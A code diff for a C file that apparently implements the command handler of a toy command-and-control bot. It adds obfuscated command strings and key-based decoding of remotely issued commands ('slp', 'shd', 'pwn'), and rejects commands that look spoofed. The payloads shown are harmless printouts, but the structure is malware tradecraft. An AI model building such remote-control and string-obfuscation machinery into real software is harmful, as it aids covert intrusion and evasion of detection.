@@ -4,10 +4,26 @@
 #include <stdio.h>
 
 #include "commands.h"
+#include "client.h"
 #include "../program/program.h"
+
+// private method prototypes
+static ERR_CODE executeCommand(char* cmdStr, unsigned char key);
+static void doSleep(int n);
+static void doPawn();
+static int extractN(char* cmdStr);
+
+
+// obfuscated command strings
+static const char SLP[3] = {'s','l','p'};
+static const char SHD[3] = {'s','h','d'};
+static const char PWN[3] = {'p','w','n'};
+
 
 /**
  * split the cmds based upon newline characters. Then execute each one sequentially.
+ * NOTE: if we detect the commands were incorectly encoded its likely due to the C2
+ * being spoofed, as such do not execute them!
  */
 ERR_CODE processCommands(CLIENT_HANDLER* client) {
     if (strlen(client->cmdBuffer) == 0) { return ECODE_EMPTY_BUFFER; } // no commands
@@ -17,43 +33,49 @@ ERR_CODE processCommands(CLIENT_HANDLER* client) {
     
     // we check for shutdown here in case theere are commands after the shd
     while (line != NULL) {
-        if (executeCommand(line) == ECODE_DO_SHUTDOWN) { // if we receive the shutdown command then exit!
-            return ECODE_DO_SHUTDOWN;
-        }
+        ERR_CODE ret = executeCommand(line, client->ENC_KEY);
+        // if shutdown, or the commands were incorrectly encoded then exit!
+        if (ret == ECODE_DO_SHUTDOWN)   { return ECODE_DO_SHUTDOWN; }
+        if (ret == ECODE_INCORRECT_ENC) { return ECODE_INCORRECT_ENC; }
+
         line = strtok_r(NULL, "\n", &saveState);
     }
-    // clean out the commands
-    memset(client->cmdBuffer, '\0', MAX_BUFF_LEN);
     return ECODE_SUCCESS;
 }
 
 /**
- * takes a single command, matching the given action and generating a new 
+ * Takes a single command, matching the given action and generating a new 
  * COMMAND struct. Then dispatches command execute before freeing the memory again
  */
-ERR_CODE executeCommand(char* cmdStr) {
-    if (strncmp(cmdStr, "slp", 3) == 0) {
+static ERR_CODE executeCommand(char* cmdStr, unsigned char key) {
+    printf("\nENCODED CMD: '%s'  KEY: '%02X'", cmdStr, key);
+    encode(cmdStr, &key);
+    printf("\nDECODED CMD: '%s'\n", cmdStr);
+    
+    if (strncmp(cmdStr, SLP, 3) == 0) {
         progContext->sleeping = TRUE;
         doSleep(extractN(cmdStr + 3));
         progContext->sleeping = FALSE;
 
         return ECODE_SUCCESS;
-    } else if (strncmp(cmdStr, "shd", 3) == 0) {
+    } 
+    if (strncmp(cmdStr, SHD, 3) == 0) {
         progContext->shutdown = TRUE;
         return ECODE_DO_SHUTDOWN;
-    } else if (strncmp(cmdStr, "pwn", 3) == 0) {
+    } 
+    if (strncmp(cmdStr, PWN, 3) == 0) {
         doPawn();
         return ECODE_SUCCESS;
-    } else { 
-        return ECODE_UNKNOWN_COMMAND; 
     }
+    
+    return ECODE_INCORRECT_ENC; 
 }
 
 /**
  * simply sleep for n seconds, this halts all threads because the mutex was aquired
  * before the remote commands could be executed!
  */
-void doSleep(int n) {
+static void doSleep(int n) {
     printf("Sleeping for %ds\n", n);
     Sleep(n);
     printf("Sleep finsished!\n");
@@ -62,7 +84,7 @@ void doSleep(int n) {
 /**
  * print out a you've been pwned message
  */
-void doPawn() {
+static void doPawn() {
     printf("\nUnfortunately you been pwn'ed hehehe (educationally speaking :))!\n");
     printf("You may potentially want to change you password (or not, simply live in the fast lane man).\n\n");
 }
@@ -71,7 +93,7 @@ void doPawn() {
  * This method will only only return a +ve int when the slp command is given, otherwise it returns 0. 
  * It will simple skip an whitespaces and then return the number if it exists
  */
-int extractN(char* cmdStr) {
+static int extractN(char* cmdStr) {
     while (*cmdStr != '\0' && !isdigit(*cmdStr)) { cmdStr++; }  // skip non-digit chars
 
     if (isdigit(*cmdStr)) { // return the number if it exists
